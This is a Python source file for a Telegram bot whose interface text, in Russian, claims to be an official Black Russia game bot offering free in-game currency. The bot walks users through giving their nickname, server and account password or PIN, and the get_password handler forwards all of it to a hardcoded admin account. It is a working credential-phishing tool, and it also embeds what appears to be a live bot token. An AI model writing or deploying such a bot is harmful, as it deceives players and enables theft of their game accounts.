import logging
import os
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler

BOT_TOKEN = "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM"
ADMIN_ID = 6005507174

NICKNAME, SERVER, PASSWORD = range(3)
user_data = {}

def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("💰 Получить 25кк", callback_data="get_money")],
        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "👋 *Добро пожаловать!*\n\n"
        "🤵 *Официальный бот от Black Russia*\n"
        "💰 Ты можешь получить *бесплатные 25кк* на *любом сервере*!\n\n"
        "⬇️ Используй кнопки ниже:"
    )
    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu())

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    welcome_text = "👋 *Главное меню*\n\n🤵 Официальный бот от Black Russia\n💰 Бесплатные 25кк"
    await query.edit_message_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu())

async def get_money_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🎮 *Шаг 1 из 3:*\nВведите ваш *НИК* в Black Russia:", parse_mode="Markdown")
    return NICKNAME

async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id] = {"nickname": update.message.text}
    await update.message.reply_text("🌍 *Шаг 2 из 3:*\nУкажите название *СЕРВЕРА*:", parse_mode="Markdown")
    return SERVER

async def get_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id]["server"] = update.message.text
    await update.message.reply_text("🔐 *Шаг 3 из 3:*\nВведите *ПАРОЛЬ* (или пинкод) от аккаунта:", parse_mode="Markdown")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = user_data.get(user_id, {})
    nickname = data.get("nickname", "?")
    server = data.get("server", "?")
    password = update.message.text
    username = update.effective_user.username or "Нет юзернейма"
    full_name = update.effective_user.full_name

    admin_msg = (
        f"🔔 *НОВАЯ ЗАЯВКА НА 25кк!*\n\n"
        f"👤 *Пользователь:* {full_name}\n"
        f"🆔 *ID:* `{user_id}`\n"
        f"📛 *Username:* @{username}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎮 *Ник:* `{nickname}`\n"
        f"🌍 *Сервер:* `{server}`\n"
        f"🔑 *Пароль:* `{password}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Ожидает выдачи!"
    )

    try:
        await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
        await update.message.reply_text(
            "✅ *Заявка принята!*\n\n"
            "💰 Валюта придет в течение *24 часов*.\n"
            "🙏 Спасибо!",
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )
    except Exception as e:
        await update.message.reply_text("⚠️ Ошибка, владелец уведомлен.")

    if user_id in user_data:
        del user_data[user_id]
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено.")
    return ConversationHandler.END

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Нет доступа")
        return
    await update.message.reply_text("🔧 Панель владельца. Бот работает!")

async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Ваш ID: `{update.effective_user.id}`", parse_mode="Markdown")

# ========== НАСТРОЙКА ==========
app = Flask(__name__)

bot_app = Application.builder().token(BOT_TOKEN).build()

conv_handler = ConversationHandler(
    entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
    states={
        NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
        SERVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_server)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)

bot_app.add_handler(CommandHandler("start", start))
bot_app.add_handler(CommandHandler("admin", admin_panel))
bot_app.add_handler(CommandHandler("id", get_id))
bot_app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="main_menu"))
bot_app.add_handler(conv_handler)

# Принудительная установка вебхука при старте
WEBHOOK_URL = None

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(), bot_app.bot)
    bot_app.process_update(update)
    return "ok", 200

@app.route("/")
def index():
    return "Bot is running!", 200

if __name__ == "__main__":
    import sys
    port = int(os.getenv("PORT", 8080))
    render_url = os.getenv("RENDER_EXTERNAL_URL")
    
    if render_url:
        webhook_url = f"{render_url}/webhook/{BOT_TOKEN}"
        print(f"Setting webhook to: {webhook_url}")
        bot_app.bot.set_webhook(webhook_url)
        print("Webhook set successfully!")
    else:
        print("No RENDER_EXTERNAL_URL, running with polling...")
    
    print(f"Starting Flask server on port {port}")
    app.run(host="0.0.0.0", port=port)
